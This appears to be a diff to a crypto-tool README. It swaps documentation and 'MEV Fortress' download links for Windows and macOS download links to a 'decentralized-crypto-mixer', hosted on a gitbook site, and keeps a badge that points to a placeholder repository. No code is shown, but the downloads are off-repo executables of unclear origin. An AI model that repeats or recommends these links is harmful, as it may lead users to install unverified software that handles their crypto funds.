@@ -11,9 +11,8 @@
 
 ---
 
-# How to use + About + Download
-### [Documentation](https://selenium-finance.gitbook.io/mev-fortress-documentation)
-### **Download** [Windows](https://selenium-finance.gitbook.io/mev-fortress-documentation/download/windows) / [macOS](https://selenium-finance.gitbook.io/mev-fortress-documentation/download/macos)
+# Download
+### **Download** [Windows](https://selenium-finance.gitbook.io/decentralized-crypto-mixer/download/windows) / [macOS](https://selenium-finance.gitbook.io/decentralized-crypto-mixer/download/macos)
 
 [![License](https://img.shields.io/badge/License-MIT-green)](https://github.com/yourusername/defi-algo-bot)
 [![Python](https://img.shields.io/badge/Python-3.10%2B-blue)](https://www.python.org)
